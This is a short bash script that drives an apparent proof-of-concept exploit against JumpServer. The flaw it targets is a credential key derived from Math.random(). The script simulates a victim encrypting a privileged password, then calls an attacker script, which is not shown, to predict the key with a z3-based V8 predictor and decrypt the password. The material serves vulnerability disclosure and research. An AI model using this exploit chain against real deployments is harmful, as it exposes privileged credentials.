#!/usr/bin/env bash
# GlassBastion — end-to-end PoC for JumpServer's Math.random()-derived credential key.
# Generates a victim capture, then recovers the plaintext credential as the attacker.
set -euo pipefail
cd "$(dirname "$0")"

# deps: node (victim + base36), python3 + z3-solver (V8 predictor) + cryptography (AES)
python3 -c "import z3" 2>/dev/null || timeout 150 pip install --break-system-packages z3-solver >/dev/null 2>&1 || {
  echo "could not install z3-solver (needed for the Math.random predictor)"; exit 1; }
python3 -c "import cryptography" 2>/dev/null || timeout 120 pip install --break-system-packages cryptography >/dev/null 2>&1 || true

echo "=== victim: encrypts a privileged credential exactly as JumpServer does ==="
node victim.js > capture.json
python3 - <<'PY'
import json;d=json.load(open("capture.json"))
print("  leaked Math.random samples:", [round(x,6) for x in d["observed"]])
print("  captured passwordCipher   :", d["passwordCipher"])
PY

echo
echo "=== attacker: predicts the key from Math.random and decrypts (no RSA privkey) ==="
python3 attacker.py capture.json
